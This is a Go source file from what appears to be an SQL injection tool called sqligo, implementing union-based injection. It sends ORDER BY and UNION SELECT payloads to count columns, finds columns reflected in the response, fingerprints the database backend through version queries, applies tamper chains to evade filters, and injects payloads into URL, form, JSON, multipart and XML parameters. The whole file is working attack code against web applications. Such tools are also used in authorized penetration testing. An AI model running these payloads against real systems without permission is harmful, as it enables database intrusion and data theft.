package core

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/R0X4R/sqligo/pkg/config"
	"github.com/R0X4R/sqligo/pkg/logger"
	"github.com/R0X4R/sqligo/pkg/request"
	"github.com/R0X4R/sqligo/pkg/tamper"
	"github.com/R0X4R/sqligo/pkg/utils"
)

// CheckUnionBasedSqli performs Union-based SQL injection detection
func CheckUnionBasedSqli(urlStr, data, param, value string, isHeader bool, isJson bool, isMultipart bool, isXml bool) *InjectionResult {
	logger.Info("Testing Union-based injection...")

	// Step 1: Find column count (1-50 range)
	columnCount := findColumnCount(urlStr, data, param, value, isHeader, isJson, isMultipart, isXml)
	if columnCount == 0 {
		logger.Debug("Could not determine column count")
		return &InjectionResult{Vulnerable: false}
	}

	logger.Debug("Detected %d columns", columnCount)

	// Step 2: Find injectable columns (which columns reflect in response)
	injectableColumns := findInjectableColumns(urlStr, data, param, value, columnCount, isHeader, isJson, isMultipart, isXml)
	if len(injectableColumns) == 0 {
		logger.Debug("No injectable columns found")
		return &InjectionResult{Vulnerable: false}
	}

	logger.Success("Found injectable columns: %v", injectableColumns)

	// Step 3: Confirm with test extraction
	testVector := constructUnionVector(columnCount, injectableColumns[0])

	return &InjectionResult{
		Vulnerable:        true,
		Parameter:         param,
		InjectionType:     "Union-based",
		Vector:            testVector,
		Payload:           testVector,
		Backend:           detectBackendFromUnion(urlStr, data, param, value, testVector, isHeader, isJson, isMultipart, isXml),
		InjectableColumns: injectableColumns,
		ColumnCount:       columnCount,
	}
}

// findColumnCount determines the number of columns using ORDER BY or UNION SELECT NULL
func findColumnCount(urlStr, data, param, value string, isHeader, isJson, isMultipart, isXml bool) int {
	// Try ORDER BY method first (more reliable) - limit to 10 columns for speed
	maxColumns := 10
	for i := 1; i <= maxColumns; i++ {
		payload := fmt.Sprintf("ORDER BY %d--", i)

		// Apply tampers if configured
		if len(config.GlobalConfig.Tamper) > 0 {
			payload = tamper.ApplyChain(payload, config.GlobalConfig.Tamper)
		}

		injectedUrl, injectedData := injectPayload(urlStr, data, param, value, payload, isHeader, isJson, isMultipart, isXml)

		req := request.NewRequest(injectedUrl)
		req.Data = injectedData

		resp, err := req.Execute()
		if err != nil || resp.StatusCode >= 500 {
			// Error means we exceeded column count
			if i == 1 {
				// Failed on first column - Union not viable
				return 0
			}
			return i - 1
		}

		// Small delay to avoid rate limiting
		if config.GlobalConfig.Delay > 0 {
			time.Sleep(time.Duration(config.GlobalConfig.Delay) * time.Second)
		}
	}

	// Fallback: Try UNION SELECT NULL method
	for i := 1; i <= 50; i++ {
		nulls := strings.Repeat("NULL,", i-1) + "NULL"
		payload := fmt.Sprintf("UNION ALL SELECT %s--", nulls)

		if len(config.GlobalConfig.Tamper) > 0 {
			payload = tamper.ApplyChain(payload, config.GlobalConfig.Tamper)
		}

		injectedUrl, injectedData := injectPayload(urlStr, data, param, value, payload, isHeader, isJson, isMultipart, isXml)

		req := request.NewRequest(injectedUrl)
		req.Data = injectedData

		resp, err := req.Execute()
		if err == nil && resp.StatusCode < 400 {
			return i
		}

		if config.GlobalConfig.Delay > 0 {
			time.Sleep(time.Duration(config.GlobalConfig.Delay) * time.Second)
		}
	}

	return 0
}

// findInjectableColumns identifies which columns reflect in the response
func findInjectableColumns(urlStr, data, param, value string, columnCount int, isHeader, isJson, isMultipart, isXml bool) []int {
	injectable := []int{}
	marker := "github.com/R0X4R/sqligoMarker"

	for i := 1; i <= columnCount; i++ {
		// Build UNION with marker in position i
		nulls := []string{}
		for j := 1; j <= columnCount; j++ {
			if j == i {
				nulls = append(nulls, fmt.Sprintf("'%s%d'", marker, i))
			} else {
				nulls = append(nulls, "NULL")
			}
		}

		payload := fmt.Sprintf("UNION ALL SELECT %s--", strings.Join(nulls, ","))

		if len(config.GlobalConfig.Tamper) > 0 {
			payload = tamper.ApplyChain(payload, config.GlobalConfig.Tamper)
		}

		injectedUrl, injectedData := injectPayload(urlStr, data, param, value, payload, isHeader, isJson, isMultipart, isXml)

		req := request.NewRequest(injectedUrl)
		req.Data = injectedData

		resp, err := req.Execute()
		if err == nil {
			// Check if marker appears in response
			if strings.Contains(resp.Body, fmt.Sprintf("%s%d", marker, i)) {
				injectable = append(injectable, i)
			}
		}

		if config.GlobalConfig.Delay > 0 {
			time.Sleep(time.Duration(config.GlobalConfig.Delay) * time.Second)
		}
	}

	return injectable
}

// constructUnionVector creates a Union injection vector
func constructUnionVector(columnCount, injectableColumn int) string {
	nulls := []string{}
	for i := 1; i <= columnCount; i++ {
		if i == injectableColumn {
			nulls = append(nulls, "[QUERY]")
		} else {
			nulls = append(nulls, "NULL")
		}
	}
	return fmt.Sprintf("UNION ALL SELECT %s--", strings.Join(nulls, ","))
}

// detectBackendFromUnion attempts to detect database backend using Union
func detectBackendFromUnion(urlStr, data, param, value, vector string, isHeader, isJson, isMultipart, isXml bool) string {
	tests := map[string]string{
		"MySQL":                "VERSION()",
		"PostgreSQL":           "VERSION()",
		"Microsoft SQL Server": "@@VERSION",
		"Oracle":               "BANNER FROM v$version",
	}

	for backend, query := range tests {
		testPayload := strings.Replace(vector, "[QUERY]", query, 1)

		if len(config.GlobalConfig.Tamper) > 0 {
			testPayload = tamper.ApplyChain(testPayload, config.GlobalConfig.Tamper)
		}

		injectedUrl, injectedData := injectPayload(urlStr, data, param, value, testPayload, isHeader, isJson, isMultipart, isXml)

		req := request.NewRequest(injectedUrl)
		req.Data = injectedData

		resp, err := req.Execute()
		if err == nil && resp.StatusCode < 400 {
			// Check for backend-specific strings in response
			body := strings.ToLower(resp.Body)
			if backend == "MySQL" && (strings.Contains(body, "mysql") || regexp.MustCompile(`\d+\.\d+\.\d+`).MatchString(body)) {
				return "MySQL"
			} else if backend == "PostgreSQL" && strings.Contains(body, "postgresql") {
				return "PostgreSQL"
			} else if backend == "Microsoft SQL Server" && strings.Contains(body, "microsoft") {
				return "Microsoft SQL Server"
			} else if backend == "Oracle" && strings.Contains(body, "oracle") {
				return "Oracle"
			}
		}
	}

	return "Unknown"
}

// injectPayload helper function to inject payload into various injection points
func injectPayload(urlStr, data, param, value, payload string, isHeader, isJson, isMultipart, isXml bool) (string, string) {
	var injectedUrl string
	var injectedData string

	fullPayload := value + payload

	if isHeader {
		// Headers are handled differently - return original URL/data
		injectedUrl = urlStr
		injectedData = data
		// Note: Header injection would need to be handled in request creation
	} else if isJson {
		injectedUrl = urlStr
		var jMap map[string]interface{}
		_ = json.Unmarshal([]byte(data), &jMap)
		jMap[param] = fullPayload
		byteData, _ := json.Marshal(jMap)
		injectedData = string(byteData)
	} else if isMultipart {
		injectedUrl = urlStr
		injectedData = utils.ReplaceMultipartValue(data, param, fullPayload)
	} else if isXml {
		injectedUrl = urlStr
		injectedData = utils.ReplaceXmlValue(data, param, fullPayload)
	} else {
		if data != "" {
			injectedData = strings.Replace(data, param+"="+value, param+"="+utils.UrlEncode(fullPayload), 1)
			injectedUrl = urlStr
		} else {
			injectedUrl = strings.Replace(urlStr, param+"="+value, param+"="+utils.UrlEncode(fullPayload), 1)
		}
	}

	return injectedUrl, injectedData
}
